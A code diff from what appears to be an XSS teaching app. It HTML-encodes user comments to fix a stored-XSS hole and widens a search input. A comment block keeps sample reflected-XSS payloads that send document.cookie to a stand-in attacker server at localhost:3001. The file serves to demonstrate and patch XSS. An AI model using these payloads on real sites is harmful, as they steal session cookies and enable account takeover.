@@ -9,7 +9,7 @@ solution: ${htmlencode.htmlEncode(comment)}
 */
 
 /* Examples of reflected xss
-http://localhost:3000/search_payments?date=%3Cscript%3Evar%20url%20=%20`http://localhost:3001/hack?victimCookie=${document.cookie}`;document.write(`%3Cimg%20src=%22${url}%22/%3E`);%3C/script%3E
+http://localhost:3000/search_payments?date=%3Cscript%3Evar+url+%3D+%60http%3A%2F%2Flocalhost%3A3001%2Fhack%3FvictimCookie%3D%24%7Bdocument.cookie%7D%60%3Bdocument.write%28%60%3Cimg+src%3D%22%24%7Burl%7D%22%2F%3E%60%29%3B%3C%2Fscript%3E
 
 With Same Origin Policy Block:
 <script>var url = `http://localhost:3001/hack?victimCookie=${document.cookie}`;fetch(url);</script>
@@ -56,7 +56,7 @@ const fetchAndRenderCommentsList = async () => {
                 <p><strong>Name:</strong> ${user_name}</p>
                 <div>
                     <p><strong>Comment:</strong></p>
-                    <p>${comment}</p>
+                    <p>${htmlencode.htmlEncode(comment)}</p>
                 </div>
             </li>`;
         });
@@ -419,7 +419,7 @@ app.get('/payments', (req, res) => {
     return res.send(`<html>
         <main>
             <form method="GET" action="/search_payments">
-                <input name="date" type="text"/>
+                <input name="date" type="text" style="width: 80%"/>
                 <button type="submit">Search</button>
             </form>
             <a href="/me">Home</a>
